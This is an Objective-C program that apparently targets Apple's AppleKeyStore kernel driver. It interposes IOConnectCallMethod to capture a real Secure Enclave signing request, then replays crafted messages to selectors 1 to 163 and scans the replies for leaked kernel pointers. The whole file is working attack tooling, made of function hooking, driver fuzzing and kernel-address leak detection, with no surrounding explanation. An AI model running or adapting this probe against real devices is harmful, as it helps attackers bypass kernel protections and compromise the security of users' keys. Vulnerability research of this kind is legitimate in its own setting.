#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <Security/SecKey.h>
#import <Security/SecItem.h>
#import <IOKit/IOKitLib.h>
extern kern_return_t IOConnectCallMethod(io_connect_t, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
#include <dlfcn.h>
#include <pthread.h>

typedef kern_return_t (*IOConnectCallMethod_fn)(io_connect_t, uint32_t,
    const uint64_t*, uint32_t, const void*, size_t,
    uint64_t*, uint32_t*, void*, size_t*);

static kern_return_t real_call(io_connect_t c, uint32_t sel,
    const uint64_t *si, uint32_t sic, const void *ib, size_t ibc,
    uint64_t *so, uint32_t *soc, void *ob, size_t *obc)
{
    static IOConnectCallMethod_fn fn = NULL;
    if (!fn) fn = (IOConnectCallMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallMethod");
    return fn(c, sel, si, sic, ib, ibc, so, soc, ob, obc);
}

// ---- capture of a real AKS IOConnectCallMethod made by Security.framework in-process
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;
static volatile int g_armed = 0, g_done = 0;
static io_connect_t g_conn = 0; static uint32_t g_sel = 0; static uint8_t g_in[64]; static size_t g_inlen = 0;
static uint8_t g_out[64]; static size_t g_outlen = 0; static uint64_t g_so[8]; static uint32_t g_soc = 0;

static kern_return_t my_call(io_connect_t c, uint32_t sel,
    const uint64_t *si, uint32_t sic, const void *ib, size_t ibc,
    uint64_t *so, uint32_t *soc, void *ob, size_t *obc)
{
    kern_return_t kr = real_call(c, sel, si, sic, ib, ibc, so, soc, ob, obc);
    pthread_mutex_lock(&g_lock);
    if (g_armed && ib && ibc >= 28 && ibc <= 64) {
        g_conn = c; g_sel = sel; memcpy(g_in, ib, ibc); g_inlen = ibc;
        if (ob && obc) { size_t n = *obc; if (n > 64) n = 64; memcpy(g_out, ob, n); g_outlen = n; }
        if (so && soc) { memcpy(g_so, so, (*soc > 8 ? 8 : *soc) * 8); g_soc = *soc; }
        g_done = 1;
    }
    pthread_mutex_unlock(&g_lock);
    return kr;
}
// DYLD_INTERPOSE as a section, since the macro form does not compile in ObjC++ mode
__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_IOConnectCallMethod __attribute__((section("__DATA,__interpose"))) = { (const void *)(uintptr_t)my_call, (const void *)(uintptr_t)IOConnectCallMethod };

#define OUTSZ 0x2000
static int probe(io_connect_t conn, const uint8_t handle[16], int sel, int *anyk)
{
    uint8_t msg[28]; memset(msg, 0, 28); memcpy(msg, handle, 16);
    uint32_t decl = 0x800; memcpy(msg + 24, &decl, 4);
    static uint8_t out[OUTSZ]; memset(out, 0xBB, OUTSZ); size_t outsz = OUTSZ;
    uint64_t so[8] = {0}; uint32_t soc = 8;
    kern_return_t kr = real_call(conn, sel, NULL, 0, msg, 28, so, &soc, out, &outsz);
    int nonfill = 0; for (int i = 0; i < OUTSZ; i++) if (out[i] != 0xBB) nonfill++;
    int k = 0;
    for (size_t i = 0; i + 8 <= OUTSZ && i + 8 <= outsz + 64; i += 8) {
        uint64_t v; memcpy(&v, out + i, 8);
        if (((v >> 32) == 0xfffffff0ull || (v >> 32) == 0xfffffe00ull) && (v & 0xffffffffull)) { k++; if (k <= 3) printf("AKS   KPTR sel=%d @+%#zx = %#llx\n", sel, i, (unsigned long long)v); }
    }
    *anyk += k;
    { static kern_return_t lastkr = (kern_return_t)-1; if (kr != lastkr) { printf("AKS kr-change at sel=%d -> %#010x\n", sel, (uint32_t)kr); lastkr = kr; } }
    if (nonfill || k || kr == 0) printf("AKS sel=%3d kr=%#010x outsz=%zu nonfill=%d kptr=%d soc=%u so0=%#llx\n", sel, (uint32_t)kr, outsz, nonfill, k, soc, (unsigned long long)so[0]);
    return k;
}

int main(){ @autoreleasepool{
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleKeyStore"));
    if(!svc){ printf("AKS no service\n"); return 1; }
    io_connect_t conn = 0; kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    printf("AKS open kr=%#x conn=%#x\n", (uint32_t)kr, (uint32_t)conn); if(kr) return 1;

    // Phase 1: try to capture a real ACM handle via SE signing
    NSMutableDictionary *attrs = [NSMutableDictionary dictionary];
    attrs[(__bridge id)kSecAttrTokenID] = (__bridge id)kSecAttrTokenIDSecureEnclave;
    attrs[(__bridge id)kSecAttrKeyType] = (__bridge id)kSecAttrKeyTypeECSECPrimeRandom;
    attrs[(__bridge id)kSecAttrKeySizeInBits] = @256;
    attrs[(__bridge id)kSecAttrAccessible] = (__bridge id)kSecAttrAccessibleAfterFirstUnlock;
    attrs[(__bridge id)kSecPrivateKeyAttrs] = @{};
    CFErrorRef err = NULL; SecKeyRef key = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attrs, &err);
    int cap = 0;
    if (key) {
        g_armed = 1;
        uint8_t digest[32]; memset(digest, 0x42, 32);
        CFErrorRef serr = NULL; CFDataRef sig = SecKeyCreateSignature(key, kSecKeyAlgorithmECDSASignatureMessageX962SHA256, CFDataCreate(NULL, digest, 32), &serr);
        g_armed = 0;
        pthread_mutex_lock(&g_lock); cap = g_done; pthread_mutex_unlock(&g_lock);
        printf("AKS phase1 key=%p sig=%s capture=%d\n", key, sig ? "ok" : "nil", cap);
        if (serr) printf("AKS sign err=%s\n", [[(__bridge NSError*)serr description] UTF8String]);
        if (sig) CFRelease(sig); CFRelease(key);
    } else printf("AKS phase1 key err=%s capture=0\n", err ? [[(__bridge NSError*)err description] UTF8String] : "?");

    // Phase 2: scan
    int anyk = 0, nact = 0;
    for (int phase = 0; phase < 2; phase++) {
        uint8_t zero[16] = {0}; const uint8_t *h = zero;
        io_connect_t c = conn;
        if (phase == 1) { if (!cap) break; h = g_in; c = g_conn; printf("AKS phase2 captured: conn=%#x sel=%u inlen=%zu in=", (uint32_t)c, g_sel, g_inlen); for (int i = 0; i < (int)g_inlen; i++) printf("%02x", g_in[i]); printf("\n"); }
        printf("AKS phase2 (%s): scanning selectors 1..163\n", phase ? "captured handle" : "zero handle");
        for (int sel = 1; sel <= 163; sel++) { int before = anyk; probe(c, h, sel, &anyk); if (anyk > before) nact++; }
    }
    printf("AKS SUMMARY kptr_total=%d selectors_with_kptr=%d\n", anyk, nact);
    IOServiceClose(conn); (void)real_call; } return 0; }
